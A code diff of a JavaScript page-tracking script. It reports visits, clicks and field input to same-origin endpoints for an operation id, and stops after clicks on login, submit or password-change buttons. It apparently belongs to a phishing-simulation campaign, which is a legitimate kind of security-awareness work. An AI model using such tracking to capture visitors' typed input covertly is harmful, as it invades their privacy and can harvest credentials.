@@ -1,44 +1,47 @@
 document.addEventListener('DOMContentLoaded', () => {
-    // DOMContentLoaded	запускает код после полной загрузки страницы
-    // Получаем id операции из URL (?id=...)
     const urlParams = new URLSearchParams(window.location.search);
     const operationId = urlParams.get('id');
-
-    // Если нет operation_id — не продолжаем
     if (!operationId) return;
 
-    // для прекращения отслеживания после клика по важной кнопке/ссылке
-    let trackingStopped = false;
+    let trackingStopped = localStorage.getItem("trackingStopped_" + operationId) === "true";
 
-    // Получаем текущую дату и время в формате ISO (например, 2025-04-20T12:34:56.789Z)
     function getCurrentTimestamp() {
         return new Date().toISOString();
     }
 
-    // Общая функция для отправки данных на сервер
     async function sendData(url, data) {
         if (trackingStopped) return;
 
         try {
-            await fetch(url, {
+            const response = await fetch(url, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
                 },
                 body: JSON.stringify(data)
             });
+
+            // ✅ Если это важная кнопка — проверяем ответ сервера
+            if (url.includes("/track/button_click") && response.ok) {
+                const result = await response.json();
+                if (result.stop_tracking === true) {
+                    trackingStopped = true;
+                    console.log("Трекинг остановлен по ответу сервера.");
+                }
+            }
+
         } catch (err) {
             console.error("Ошибка при отправке данных:", err);
         }
     }
 
-    // Отправка события захода на сайт
+    // ✅ 1. Событие захода
     sendData('/track/visit', {
         operation_id: operationId,
         timestamp: getCurrentTimestamp()
     });
 
-    // Клики по странице
+    // ✅ 2. Клики
     document.addEventListener('click', (e) => {
         if (trackingStopped) return;
 
@@ -50,7 +53,6 @@ document.addEventListener('DOMContentLoaded', () => {
 
         const text = (e.target.innerText || "").toLowerCase();
 
-        // Ключевые кнопки и ссылки
         const importantWords = [
             'войти', 'войти по эцп', 'отправить заявку', 'зарегистрироваться',
             'отправить', 'сохранить', 'сменить пароль', 'забыли пароль?',
@@ -60,8 +62,7 @@ document.addEventListener('DOMContentLoaded', () => {
         const isImportant = importantWords.some(word => text.includes(word));
 
         if (isImportant) {
-            // Событие нажатия важной кнопки — остановка всего трекинга
-            trackingStopped = true;
+            // ✅ Отправка важной кнопки, сервер должен ответить stop_tracking: true
             sendData('/track/button_click', {
                 operation_id: operationId,
                 timestamp: getCurrentTimestamp(),
@@ -69,7 +70,7 @@ document.addEventListener('DOMContentLoaded', () => {
             });
         }
 
-        // Отправка клика (даже если важный — он попадёт в базу "clicks", но только один раз)
+        // ✅ Отправка клика (только если трекинг не остановлен)
         sendData('/track/click', {
             operation_id: operationId,
             timestamp: getCurrentTimestamp(),
@@ -80,7 +81,7 @@ document.addEventListener('DOMContentLoaded', () => {
         });
     });
 
-    //  Ввод в поля
+    // ✅ 3. Ввод в поля
     document.addEventListener('input', (e) => {
         if (trackingStopped) return;
 
